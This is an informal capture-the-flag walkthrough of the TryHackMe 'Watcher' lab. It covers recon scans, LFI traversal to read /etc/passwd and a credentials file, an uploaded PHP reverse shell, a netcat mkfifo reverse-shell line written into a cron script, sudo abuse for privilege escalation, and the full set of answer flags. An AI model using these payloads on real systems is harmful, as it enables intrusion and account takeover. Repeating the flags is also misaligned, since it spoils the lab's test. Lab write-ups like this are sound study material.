# writeups


===nmap recon===
```
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e180ec1f269e32eb273f26acd237ba96 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7hN8ixZsMzRUvaZjiBUrqtngTVOcdko2FRpRMT0D/LTRm8x8SvtI5a52C/adoiNNreQO5/DOW8k5uxY1Rtx/HGvci9fdbplPz7RLtt+Mc9pgGHj0ZEm/X0AfhBF0P3Uwf3paiqCqeDcG1HHVceFUKpDt0YcBeiG1JJ5LZpRxqAyd0jOJsC1FBNBPZAtUA11KOEvxbg5j6pEL1rmbjwGKUVxM8HIgSuU6R6anZxTrpUPvcho9W5F3+JSxl/E+vF9f51HtIQcXaldiTNhfwLsklPcunDw7Yo9IqhqlORDrM7biQOtUnanwGZLFX7kfQL28r9HbEwpAHxdScXDFmu5wR
|   256 36ff7011058ed4507a29915875ac2e76 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBmjWU4CISIz0mdwq6ObddQ3+hBuOm49wam2XHUdUaJkZHf4tOqzl+HVz107toZIXKn1ui58hl9+6ojTnJ6jN/Y=
|   256 48d23e45da0cf0f6654ef9789737aa8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHb7zsrJYdPY9eb0sx8CvMphZyxajGuvbDShGXOV9MDX
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Corkplacemats
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Jekyll v4.1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

===dir listing===
```
/.html                (Status: 403) [Size: 278]
/images               (Status: 301) [Size: 315] [--> http://10.10.112.198/images/]
/index.php            (Status: 200) [Size: 4826]
/.php                 (Status: 403) [Size: 278]
/post.php             (Status: 200) [Size: 2422]
/css                  (Status: 301) [Size: 312] [--> http://10.10.112.198/css/]
/robots.txt           (Status: 200) [Size: 69]
[17:29:30] 200 -    1KB - /images/                                          
[17:29:32] 200 -    5KB - /index.php                                        
[17:29:32] 200 -    5KB - /index.php/login/                                 
[17:30:10] 200 -   69B  - /robots.txt   
```


===robos.txt===
```
User-agent: *
Allow: /flag_1.txt //: 200 OK I got the flag
Allow: /secret_file_do_not_read.txt //: 403 forbidden I can't find nothing 
```

===LFI===
`http://10.10.112.198/post.php?post=../../../../../../etc/passwd`
`http://10.10.112.198/post.php?post=../../../../../../../var/www/html/secret_file_do_not_read.txt`

``` ---------secret file content-----
Hi Mat, The credentials for the FTP server are below. I've set the files to 
be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:givemefiles777
```
===ftp===
```
user : ftpuser
password : givemefiles777

```
falg2 in the ftp and I upload a shell via the put method in the files dir


===revshell===
```
http://10.10.112.198/post.php?post=/home/ftpuser/ftp/files/php-reverse.php

```


====users listing in the box===
```
ftpuser  mat  toby  will root
```
I found a dir called `more_secrets_a9f10a` in the box, there was the 3rd flag

I decided to explore toby user, I got a note.txt that said
```
cat note.txt
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
```
after that by checking `sudo -l` i found something interesting like
`   (toby) NOPASSWD: ALL`
so we were connected like `www-data` just switch to toby and here the 4th flag, after 
that let's work with the cronjob, jump to the "jobs" dir, and then rewrite the cow.sh
file after that prepare our listinng and here there is the shell with mat user, here
my payload
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.91.36 4444 >/tmp/f" >> cow.sh
```
then I entered in the mat user, I found a note.txt that said
```
Hi Mat,

I've set up your sudo rights to use the python script as my user. 
You can only run the script with sudo so it should be safe.

Will
```
sounds great this note so let's check, 
` (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *` here there is,
we can execute python3 like we want with sudo rights, so now we have just to set another revshell
and let's go, set one with cmd.py file, and after passed it to the will_script, so the
result will be 
`sudo -u will python3 /home/mat/scripts/will_script.py cmd.py`, so after going through
the home/will I found it, so the last flag they said somthing abt ssh keyfile, so maybe id_rsa 
or authorized_keys, let's see, we know linux are 2 backups, /var/backups and /opt/backups
always check these dirs because they use to have some interesting files, and without forget
/tmp. `/opt/backups` I found key.b64, so after decode the key.b64 it was an id_rsa, so I set the
id_rsa and then 


1. `FLAG{robots_dot_text_what_is_next}`
2. `FLAG{ftp_you_and_me}`
3. `FLAG{lfi_what_a_guy}`
4. `FLAG{chad_lifestyle}`
5. `FLAG{live_by_the_cow_die_by_the_cow}`
6. `FLAG{but_i_thought_my_script_was_secure}`
7. `FLAG{who_watches_the_watchers}`

END

take a look if you need help 
`https://sankethj.medium.com/watcher-tryhackme-walkthrough-317fe4e502ef`
